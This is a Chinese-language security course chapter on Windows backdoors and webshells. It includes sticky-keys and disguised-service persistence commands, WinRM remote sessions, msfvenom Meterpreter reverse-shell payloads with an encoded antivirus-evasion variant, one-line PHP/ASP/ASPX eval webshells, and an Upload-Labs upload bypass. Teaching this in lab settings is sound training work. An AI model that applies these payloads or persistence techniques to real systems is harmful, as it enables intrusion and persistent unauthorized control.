---
title: "07.项目七 Windows应用安全"
---

# 任务一 Windows应用后门

## 🧠 理论知识

### 后门（Backdoor）

**定义**：后门是攻击者预先在系统中植入的秘密访问通道，绕过正常的安全认证机制，使其在失去初始访问权限后仍能重新进入系统。

**后门的分类**：

| 类型 | 说明 | 示例 |
| --- | --- | --- |
| **账户后门** | 隐藏的高权限账户 | 隐藏的$账户、粘滞键后门 |
| **服务后门** | 以系统服务形式运行的恶意程序 | 利用sc创建服务 |
| **注册表后门** | 修改注册表实现持久化 | Run键、RunOnce键 |
| **计划任务后门** | 定时执行的恶意任务 | schtasks创建任务 |
| **WMI事件订阅** | 利用WMI事件触发恶意代码 | 高级持久化，难以检测 |
| **DLL劫持** | 替换合法DLL为恶意DLL | 针对特定应用程序 |

---

### Windows系统服务机制创建后门

**原理**：Windows服务在系统启动时自动运行，且以SYSTEM权限运行，是持久化后门的理想载体。

**创建服务后门**：

```
# 创建恶意服务（以反弹Shell程序为例）
sc create "WindowsUpdateHelper" binpath="C:\Windows\Temp\malware.exe" start=auto
sc description "WindowsUpdateHelper" "Provides Windows Update services"
sc start "WindowsUpdateHelper"
```

**注册表持久化路径**：

| 注册表路径 | 触发时机 | 适用范围 |
| --- | --- | --- |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | 系统启动 | 所有用户 |
| `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | 用户登录 | 当前用户 |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce` | 下次启动时运行一次 | 所有用户 |
| `HKLM\SYSTEM\CurrentControlSet\Services` | 系统启动 | 服务形式 |

---

## 🛠️ 实践操作

### Windows “5次Shift” 后门（粘滞键后门）

**原理**：Windows登录界面按5次Shift键会启动 `sethc.exe`（粘滞键程序），该程序以SYSTEM权限运行。将其替换为 `cmd.exe` 后，可在登录界面获得SYSTEM权限的命令行。

```
# 需要在系统离线（PE环境）或已有SYSTEM权限时操作
# 备份原文件
copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc.exe.bak

# 替换为cmd.exe
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

# 恢复方法
copy C:\Windows\System32\sethc.exe.bak C:\Windows\System32\sethc.exe
```

**防御**：在登录界面的易用性访问功能中，现代Windows已通过文件保护机制（WFP）和Secure Boot限制此类替换。

---

### Windows端口复用后门（WinRM服务）

WinRM（Windows Remote Management）是Windows远程管理服务，支持PowerShell远程会话。

```powershell
# 在靶机上启用WinRM
Enable-PSRemoting -Force

# 添加受信任主机（允许攻击机连接）
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "192.168.100.10" -Force

# 从攻击机连接
Enter-PSSession -ComputerName 192.168.100.20 -Credential (Get-Credential)

# 或使用Invoke-Command远程执行
Invoke-Command -ComputerName 192.168.100.20 -ScriptBlock {whoami; hostname} -Credential (Get-Credential)
```

---

### Windows反弹木马（msfvenom + Meterpreter）

**msfvenom** 是Metasploit Framework中的Payload生成工具。

```bash
# 生成Windows反弹Shell EXE木马
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=4444 -f exe -o malware.exe

# 生成PowerShell脚本木马
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=4444 -f psh -o malware.ps1

# 生成带编码的免杀木马（简单绕过基础AV）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o malware_encoded.exe

# 在攻击机上监听
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.100.10
set LPORT 4444
exploit -j
```

**Meterpreter常用命令**：

| 命令 | 功能 |
| --- | --- |
| `getuid` | 查看当前用户权限 |
| `getsystem` | 尝试提权到SYSTEM |
| `ps` | 查看进程列表 |
| `migrate <pid>` | 迁移到其他进程 |
| `hashdump` | 导出系统密码哈希 |
| `screenshot` | 截取屏幕 |
| `upload/download` | 上传/下载文件 |
| `persistence` | 安装持久化后门 |
| `portfwd` | 端口转发 |

> 🆕 **新内容补充（现代免杀技术）** ：传统的msfvenom生成的EXE已被主流杀软识别。现代攻击者使用以下技术规避检测：
> 

> • **Shellcode注入**：将shellcode注入合法进程（如notepad.exe）
> 

> • **内存加载（Fileless Malware）** ：直接在内存中执行，不写入磁盘
> 

> • **白名单利用（LOLBins）** ：利用系统自带工具（PowerShell、certutil、regsvr32等）执行恶意代码
> 

> • **防御建议**：部署EDR（端点检测与响应）解决方案，不依赖传统特征码杀毒
> 

---

# 任务二 WebShell上传和连接

## 🧠 理论知识

### 木马（Trojan）

**木马**是一类伪装成合法软件、以欺骗用户安装的恶意程序，通常允许攻击者远程控制受害计算机。

**木马分类**：

| 类型 | 说明 |
| --- | --- |
| 远控木马（RAT） | 全功能远程控制（如Cobalt Strike、Metasploit） |
| 信息窃取木马（Stealer） | 窃取密码、Cookie、加密货币钱包等 |
| 键盘记录器（Keylogger） | 记录键盘输入 |
| 后门木马（Backdoor） | 维持对系统的持久访问 |
| 下载者（Downloader） | 用于下载并执行其他恶意软件 |
| 勒索木马（Ransomware） | 加密文件勒索赎金 |

---

### WebShell分类

**WebShell** 是以网页文件形式存在于Web服务器上的恶意脚本，攻击者通过浏览器远程控制服务器：

| 类型 | 说明 | 示例 |
| --- | --- | --- |
| **小马** | 功能单一，仅用于上传大马 | 几行代码的文件上传功能 |
| **大马** | 功能完整，含文件管理、命令执行、数据库连接 | China Chopper、冰蝎 |
| **一句话木马** | 极简代码，配合客户端工具使用 | `<?php @eval($_POST['cmd']);?>` |

**常见一句话木马示例**：

```php
<!-- PHP 一句话木马 -->
<?php @eval($_POST['cmd']);?>

<!-- ASP 一句话木马 -->
<%execute(request("cmd"))%>

<!-- ASPX 一句话木马 -->
<%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>
```

---

### Upload-Labs靶场

Upload-Labs 是专门用于学习文件上传漏洞的练习靶场，包含21个不同难度的文件上传关卡，涵盖：

- 前端JavaScript验证绕过
- Content-Type绕过
- 文件扩展名黑名单/白名单绕过
- 文件内容验证绕过（图片马）
- Apache/IIS解析漏洞

---

## 🛠️ 实践操作

### 安装phpStudy并配置Upload-Labs

```
# phpStudy是集成了Apache/Nginx + PHP + MySQL的Windows集成环境
# 1. 下载phpStudy 2018版本（内置PHP 5.x，便于复现漏洞）
# 2. 安装后启动Apache和MySQL
# 3. 将Upload-Labs放入网站根目录（如 C:\phpstudy\WWW\upload-labs）
# 4. 访问 http://localhost/upload-labs/
```

### 上传WebShell（以Upload-Labs Pass-01为例）

**前端验证绕过**：

1. 准备一句话木马文件 `shell.php`
2. 前端校验只允许上传图片，利用Burp Suite拦截请求
3. 将请求中的文件名从 `shell.jpg` 改回 `shell.php`，转发请求
4. 服务器接受并保存 `shell.php`

### 利用”中国菜刀”连接WebShell

**中国菜刀（China Chopper）** 是一款经典的WebShell管理工具（已有多个替代品如冰蝎、哥斯拉）：

1. 打开菜刀，添加站点
2. URL填写WebShell地址：`http://192.168.100.20/upload-labs/upload/shell.php`
3. 密码填写一句话木马中的参数名（如 `cmd`）
4. 类型选择 PHP

> 🆕 **新内容补充（现代WebShell工具）** ：
> 

> • **冰蝎（Behinder）** ：加密通信，绕过IDS/WAF检测，是目前主流WebShell管理工具
> 

> • **哥斯拉（Godzilla）** ：支持多种语言、多种加密算法
> 

> • **防御WebShell**：
> 

> • 上传目录禁止执行权限（IIS：删除.php等解析器映射）
> 

> • 部署RASP（运行时应用自我保护）
> 

> • 使用WAF检测异常HTTP流量
> 

> • 定期使用D盾、河马等工具扫描WebShell
> 
1. 连接成功后可进行文件管理、命令执行、数据库管理等操作